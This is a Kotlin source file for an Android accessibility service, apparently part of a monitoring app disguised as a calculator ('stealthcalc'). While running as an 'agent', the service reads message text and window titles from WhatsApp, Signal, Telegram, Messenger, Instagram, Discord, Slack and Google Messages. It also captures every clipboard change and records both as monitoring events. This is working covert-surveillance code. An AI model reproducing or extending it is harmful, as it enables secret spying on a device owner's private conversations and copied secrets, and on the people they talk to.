package com.stealthcalc.monitoring.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.ClipboardManager
import android.content.Context
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.stealthcalc.core.logging.AppLogger
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.model.ClipboardPayload
import com.stealthcalc.monitoring.model.MonitoringEventKind
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.serialization.Serializable
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import javax.inject.Inject

@Serializable
data class ChatMessagePayload(
    val packageName: String,
    val appName: String? = null,
    val messages: List<String>,
    val windowTitle: String? = null,
    val timestampMs: Long,
)

@AndroidEntryPoint
class AccessibilityMonitorService : AccessibilityService() {

    @Inject lateinit var repository: MonitoringRepository

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var lastClipText: String? = null
    private var clipboardListener: ClipboardManager.OnPrimaryClipChangedListener? = null

    private val chatApps = setOf(
        "com.whatsapp",
        "com.whatsapp.w4b",
        "org.telegram.messenger",
        "org.thoughtcrime.securesms",
        "com.facebook.orca",
        "com.instagram.android",
        "com.discord",
        "com.Slack",
        "com.google.android.apps.messaging",
    )

    override fun onServiceConnected() {
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 300
        }

        startClipboardMonitoring()
        AppLogger.log(this, "[agent]", "Accessibility service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (!repository.isAgent) return
        if (!repository.isMetricEnabled("chat_scraping")) return

        val packageName = event.packageName?.toString() ?: return
        if (packageName !in chatApps) return

        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
        ) {
            val source = event.source ?: return
            val messages = extractTextContent(source)
            source.recycle()

            if (messages.isEmpty()) return

            scope.launch {
                runCatching {
                    val windowTitle = event.text?.joinToString(" ")
                    val appName = runCatching {
                        packageManager.getApplicationLabel(
                            packageManager.getApplicationInfo(packageName, 0)
                        ).toString()
                    }.getOrNull()

                    val payload = Json.encodeToString(
                        ChatMessagePayload(
                            packageName = packageName,
                            appName = appName,
                            messages = messages.takeLast(5),
                            windowTitle = windowTitle,
                            timestampMs = System.currentTimeMillis(),
                        )
                    )
                    repository.recordEvent(MonitoringEventKind.DEVICE_STATE, payload)
                }.onFailure { e ->
                    AppLogger.log(this@AccessibilityMonitorService, "[agent]", "Chat scrape error: ${e.message}")
                }
            }
        }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        clipboardListener?.let {
            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager
            cm?.removePrimaryClipChangedListener(it)
        }
        AppLogger.log(this, "[agent]", "Accessibility service destroyed")
        super.onDestroy()
    }

    private fun extractTextContent(node: AccessibilityNodeInfo, depth: Int = 0): List<String> {
        if (depth > 10) return emptyList()

        val texts = mutableListOf<String>()
        node.text?.toString()?.let { text ->
            if (text.isNotBlank() && text.length > 1) {
                texts.add(text)
            }
        }
        node.contentDescription?.toString()?.let { desc ->
            if (desc.isNotBlank() && desc.length > 1 && desc !in texts) {
                texts.add(desc)
            }
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            texts.addAll(extractTextContent(child, depth + 1))
            child.recycle()
        }

        return texts.distinct()
    }

    private fun startClipboardMonitoring() {
        if (!repository.isMetricEnabled("clipboard")) return

        val cm = getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager ?: return
        clipboardListener = ClipboardManager.OnPrimaryClipChangedListener {
            val clip = cm.primaryClip ?: return@OnPrimaryClipChangedListener
            if (clip.itemCount == 0) return@OnPrimaryClipChangedListener

            val text = clip.getItemAt(0)?.text?.toString() ?: return@OnPrimaryClipChangedListener
            if (text == lastClipText) return@OnPrimaryClipChangedListener
            lastClipText = text

            scope.launch {
                runCatching {
                    val payload = Json.encodeToString(
                        ClipboardPayload(
                            text = text.take(1000),
                            timestampMs = System.currentTimeMillis(),
                        )
                    )
                    repository.recordEvent(MonitoringEventKind.CLIPBOARD, payload)
                }
            }
        }
        cm.addPrimaryClipChangedListener(clipboardListener)
    }
}
